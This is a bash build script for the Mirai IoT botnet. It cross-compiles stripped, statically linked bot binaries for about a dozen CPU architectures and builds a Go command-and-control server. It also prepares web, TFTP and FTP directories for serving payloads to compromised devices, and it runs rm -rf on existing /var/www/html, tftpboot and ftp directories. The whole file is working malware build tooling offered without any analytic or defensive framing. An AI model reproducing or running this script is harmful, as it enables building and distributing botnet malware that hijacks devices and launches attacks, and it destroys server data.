#!/bin/bash
echo "Export bin"
export PATH=$PATH:/etc/xcompile/armv4l/bin
export PATH=$PATH:/etc/xcompile/armv5l/bin
export PATH=$PATH:/etc/xcompile/armv6l/bin
export PATH=$PATH:/etc/xcompile/armv7l/bin
export PATH=$PATH:/etc/xcompile/i586/bin
export PATH=$PATH:/etc/xcompile/m68k/bin
export PATH=$PATH:/etc/xcompile/mips/bin
export PATH=$PATH:/etc/xcompile/mipsel/bin
export PATH=$PATH:/etc/xcompile/powerpc/bin
export PATH=$PATH:/etc/xcompile/sh4/bin
export PATH=$PATH:/etc/xcompile/sparc/bin
export PATH=$PATH:/etc/xcompile/x86_64/bin

# Fix Go detection
if command -v go &> /dev/null; then
    export GOROOT=$(go env GOROOT)
    export GOPATH=$HOME/Projects/Proj1
    export PATH=$GOPATH/bin:$GOROOT/bin:$PATH
    
    echo "Installing Go dependencies..."
    go get github.com/go-sql-driver/mysql 2>/dev/null || echo "Warning: Could not install go-sql-driver"
    go get github.com/mattn/go-shellwords 2>/dev/null || echo "Warning: Could not install go-shellwords"
else
    echo "WARNING: Go not found, skipping Go dependencies"
fi

# Compile Setting
function compile_bot {
    "$1-gcc" -std=c99 $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -lpthread -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    "$1-strip" release/"$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}

function compile_bot_arm7 {
    "$1-gcc" -std=c99 $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -lpthread -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
}

# Clean up old builds (use current directory instead of ~)
rm -rf ./release
rm -rf /var/www/html 2>/dev/null
rm -rf /var/lib/tftpboot 2>/dev/null
rm -rf /var/ftp 2>/dev/null

# Create directories - FIX: create in current directory and handle /var properly
mkdir -p ./release

# Create /var directories only if parent exists
if [ -d "/var/www" ]; then
    mkdir -p /var/www/html/atomic
else
    echo "Warning: /var/www does not exist, creating in current directory instead"
    mkdir -p ./www/html/atomic
fi

if [ -d "/var/lib" ]; then
    mkdir -p /var/lib/tftpboot
else
    mkdir -p ./tftpboot
fi

if [ -d "/var" ]; then
    mkdir -p /var/ftp
else
    mkdir -p ./ftp
fi

# Build CNC server if Go is available
if command -v go &> /dev/null && [ -d "cnc" ]; then
    echo "Building CNC server..."
    go build cnc/*.go 2>/dev/null || echo "Warning: Could not build CNC server"
fi

echo "Building - debug"
compile_bot i586 debug.dbg "-static"
echo "Building - x86"
compile_bot i586 main_x86 "-static"
echo "Building - x86_64"
compile_bot x86_64 main_x86_64 "-static"
echo "Building - mips"
compile_bot mips main_mips "-static"
echo "Building - mipsel"
compile_bot mipsel main_mpsl "-static"
echo "Building - armv4l"
compile_bot armv4l main_arm "-static"
echo "Building - armv5l"
compile_bot armv5l main_arm5 "-static"
echo "Building - armv6l"
compile_bot armv6l main_arm6 "-static"
echo "Building - armv7l"
compile_bot_arm7 armv7l main_arm7 "-static"
echo "Building - powerpc"
compile_bot powerpc main_ppc "-static"
echo "Building - m68k"
compile_bot m68k main_m68k "-static"
echo "Building - sh4"
compile_bot sh4 main_sh4 "-static"
echo "Building - sparc"
compile_bot sparc main_spc "-static"

echo "D o n e"
echo ""
echo "Binaries compiled to: ./release/"
ls -lh ./release/ 2>/dev/null || echo "No binaries found - check for compilation errors above"